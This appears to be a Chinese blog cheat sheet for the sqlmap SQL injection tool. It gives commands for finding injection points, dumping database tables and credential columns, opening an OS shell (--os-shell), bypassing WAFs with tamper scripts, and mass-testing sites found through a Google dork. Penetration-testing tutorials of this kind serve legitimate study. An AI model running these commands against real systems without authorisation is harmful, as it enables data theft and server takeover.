<hr>
<h2 id="title-sqlmapdate-2025-05-20categories-Web-工具使用tags-sqlmap"><a href="#title-sqlmapdate-2025-05-20categories-Web-工具使用tags-sqlmap" class="headerlink" title="title: sqlmapdate: 2025-05-20categories:  - Web  - 工具使用tags:  - sqlmap"></a>title: sqlmap<br>date: 2025-05-20<br>categories:<br>  - Web<br>  - 工具使用<br>tags:<br>  - sqlmap</h2><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>同样windows下只能借助python启动，太麻烦了，我选择使用kali</p>
<h2 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法"></a>基本使用方法</h2><h3 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1. 检测注入点"></a>1. 检测注入点</h3><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot;
</code></pre>
<h3 id="2-获取数据库信息"><a href="#2-获取数据库信息" class="headerlink" title="2. 获取数据库信息"></a>2. 获取数据库信息</h3><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --dbs
</code></pre>
<h3 id="3-获取当前数据库"><a href="#3-获取当前数据库" class="headerlink" title="3. 获取当前数据库"></a>3. 获取当前数据库</h3><pre><code>sqlmap -u &quot;http://example.com/page.php?id=1&quot; --current-db
</code></pre>
<p>‍</p>
<h2 id="常用参数详解"><a href="#常用参数详解" class="headerlink" title="常用参数详解"></a>常用参数详解</h2><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>​<code>-u</code>​</td>
<td>指定目标URL</td>
<td>​<code>-u &quot;http://example.com/page.php?id=1&quot;</code>​</td>
</tr>
<tr>
<td>​<code>--data</code>​</td>
<td>POST数据</td>
<td>​<code>--data=&quot;user=admin&amp;pass=123&quot;</code>​</td>
</tr>
<tr>
<td>​<code>--cookie</code>​</td>
<td>设置Cookie</td>
<td>​<code>--cookie=&quot;PHPSESSID=123&quot;</code>​</td>
</tr>
<tr>
<td>​<code>--level</code>​</td>
<td>测试等级(1-5)</td>
<td>​<code>--level=3</code>​</td>
</tr>
<tr>
<td>​<code>--risk</code>​</td>
<td>风险等级(1-3)</td>
<td>​<code>--risk=2</code>​</td>
</tr>
<tr>
<td>​<code>--dbs</code>​</td>
<td>枚举数据库</td>
<td>​<code>--dbs</code>​</td>
</tr>
<tr>
<td>​<code>-D</code>​</td>
<td>指定数据库</td>
<td>​<code>-D testdb</code>​</td>
</tr>
<tr>
<td>​<code>--tables</code>​</td>
<td>枚举表</td>
<td>​<code>--tables</code>​</td>
</tr>
<tr>
<td>​<code>-T</code>​</td>
<td>指定表</td>
<td>​<code>-T users</code>​</td>
</tr>
<tr>
<td>​<code>--columns</code>​</td>
<td>枚举列</td>
<td>​<code>--columns</code>​</td>
</tr>
<tr>
<td>​<code>-C</code>​</td>
<td>指定列</td>
<td>​<code>-C username,password</code>​</td>
</tr>
<tr>
<td>​<code>--dump</code>​</td>
<td>导出数据</td>
<td>​<code>--dump</code>​</td>
</tr>
<tr>
<td>​<code>--os-shell</code>​</td>
<td>获取操作系统shell</td>
<td>​<code>--os-shell</code>​</td>
</tr>
<tr>
<td>​<code>--proxy</code>​</td>
<td>使用代理</td>
<td>​<code>--proxy=&quot;http://127.0.0.1:8080&quot;</code>​</td>
</tr>
<tr>
<td>​<code>--threads</code>​</td>
<td>线程数</td>
<td>​<code>--threads=5</code>​</td>
</tr>
<tr>
<td>​<code>--batch</code>​</td>
<td>自动选择默认选项</td>
<td>​<code>--batch</code>​</td>
</tr>
</tbody></table>
<p>‍</p>
<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h3 id="1-POST请求注入"><a href="#1-POST请求注入" class="headerlink" title="1. POST请求注入"></a>1. POST请求注入</h3><pre><code class="language-bash">sqlmap -u &quot;http://example.com/login.php&quot; --data=&quot;username=admin&amp;password=123&quot;
</code></pre>
<h3 id="2-使用Cookie"><a href="#2-使用Cookie" class="headerlink" title="2. 使用Cookie"></a>2. 使用Cookie</h3><pre><code class="language-bash">sqlmap -u &quot;http://example.com/member.php&quot; --cookie=&quot;PHPSESSID=123456&quot;
</code></pre>
<h3 id="3-指定数据库类型"><a href="#3-指定数据库类型" class="headerlink" title="3. 指定数据库类型"></a>3. 指定数据库类型</h3><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --dbms=mysql
</code></pre>
<h3 id="4-暴力破解表名"><a href="#4-暴力破解表名" class="headerlink" title="4. 暴力破解表名"></a>4. 暴力破解表名</h3><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --common-tables
</code></pre>
<h3 id="5-获取操作系统shell"><a href="#5-获取操作系统shell" class="headerlink" title="5. 获取操作系统shell"></a>5. 获取操作系统shell</h3><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --os-shell
</code></pre>
<h3 id="6-绕过WAF"><a href="#6-绕过WAF" class="headerlink" title="6. 绕过WAF"></a>6. 绕过WAF</h3><pre><code>sqlmap -u &quot;http://example.com/page.php?id=1&quot; --tamper=space2comment
</code></pre>
<p>‍</p>
<h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><ol>
<li><strong>使用代理观察请求</strong>：</li>
</ol>
<ul>
<li><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8080&quot;
</code></pre>
</li>
<li><strong>只检测不利用</strong>：</li>
<li><pre><code class="language-bash">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --batch --smart
</code></pre>
</li>
<li><strong>从Burp Suite日志导入</strong>：</li>
<li><pre><code class="language-bash">sqlmap -l burp.log
</code></pre>
</li>
<li><strong>使用Google搜索结果测试</strong>：</li>
</ul>
<pre><code>sqlmap -g &quot;inurl:.php?id=&quot;
</code></pre>
